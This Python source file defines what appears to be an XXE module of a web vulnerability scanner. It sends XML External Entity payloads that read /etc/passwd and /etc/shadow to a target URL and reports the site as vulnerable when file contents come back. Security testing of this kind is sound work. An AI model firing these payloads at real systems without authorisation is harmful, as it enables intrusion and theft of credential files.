from typing import Dict, List
from core.request_handler import RequestHandler

class XXEScanner:
    def __init__(self):
        self.request_handler = RequestHandler()
    
    def scan(self, url: str) -> List[Dict]:
        vulnerabilities = []
        payloads = [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>'
        ]
        headers = {'Content-Type': 'application/xml'}
        for payload in payloads:
            response = self.request_handler.send_request(
                url,
                method='POST',
                data={'xml': payload},
                headers=headers
            )
            if 'root:' in response.get('content', '') or 'etc/passwd' in response.get('content', ''):
                vulnerabilities.append({
                    'type': 'XXE',
                    'url': url,
                    'payload': payload,
                    'severity': 'Critical',
                    'description': 'XML External Entity vulnerability detected',
                    'evidence': 'File content extracted via XXE'
                })
        return vulnerabilities